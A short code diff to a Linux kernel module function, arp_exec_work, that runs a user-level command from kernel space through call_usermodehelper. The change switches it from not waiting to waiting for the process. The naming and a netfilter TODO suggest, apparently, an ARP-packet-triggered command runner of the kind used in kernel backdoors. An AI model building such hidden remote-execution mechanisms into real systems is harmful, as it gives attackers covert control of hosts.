@@ -105,7 +105,8 @@ static void arp_exec_work(struct work_struct *work) {
 
     /* Execute user-level command */
     printk(KERN_INFO "Entering usermode\n");
-    call_usermodehelper(argv[0], argv, envp, UMH_NO_WAIT);
+    call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
+    // call_usermodehelper(argv[0], argv, envp, UMH_NO_WAIT);
     atomic_dec(&work_count);
 }
 // TODO: look into NF_STOLEN
